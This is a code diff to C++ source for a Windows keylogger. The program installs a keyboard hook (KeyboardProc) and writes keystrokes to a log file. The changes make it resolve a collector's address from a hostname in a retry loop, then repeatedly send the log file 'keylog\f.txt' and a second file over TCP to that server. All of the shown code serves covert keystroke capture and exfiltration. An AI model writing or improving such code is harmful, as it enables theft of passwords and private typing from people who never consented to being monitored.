@@ -17,7 +17,7 @@ string logfile = "f.txt";
 string streamfile = "f.txt";
 
 
-string SERVER_IP = "127.0.0.1";
+string SERVER_IP = "10.228.162.126";
 const int SERVER_PORT = 1235; 
 
 string findIp(string hostname) {
@@ -90,7 +90,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 bool send(SOCKET sock){
     string size = filesize(streamfile.c_str());
-    string send = "'keylog\\f.txt'"+size+"b";
+    string send = "\"keylog\\f.txt\""+size+"b";
     sendstring(sock, send.c_str());
     bool b = sendfile(sock, streamfile.c_str());
     sendfile(sock, "b.txt");
@@ -105,6 +105,11 @@ int sender(){
 
 
     bool connected = false;
+    bool foundIp = false;
+
+    // SERVER_IP = findIp("I-AET-PF4HB1GR");
+
+    // cout << SERVER_IP << "\n";
 
     while (true){
 
@@ -122,7 +127,18 @@ int sender(){
 
         SOCKET socket_fd;
 
+        while (!foundIp){
+            string IP = findIp("I-AET-PF4HB1GR");
+            if (IP != "potato"){
+                SERVER_IP = IP;
+                foundIp = true;
+            }
+            this_thread::sleep_until(chrono::system_clock::now()+chrono::seconds(2));
+
+        }
+
         while (!connected){
+            cout << SERVER_IP.length() << "\n";
             socket_fd = socket(AF_INET, SOCK_STREAM, 0);
             if (socket_fd == INVALID_SOCKET) {
                 cout << "could not make socket" << endl;
@@ -144,7 +160,8 @@ int sender(){
         }
         cout << "sent\n";
         connected = send(socket_fd);
-        this_thread::sleep_until(chrono::system_clock::now()+chrono::seconds(5));
+        foundIp = connected;
+        this_thread::sleep_until(chrono::system_clock::now()+chrono::seconds(2));
     } 
 }
 
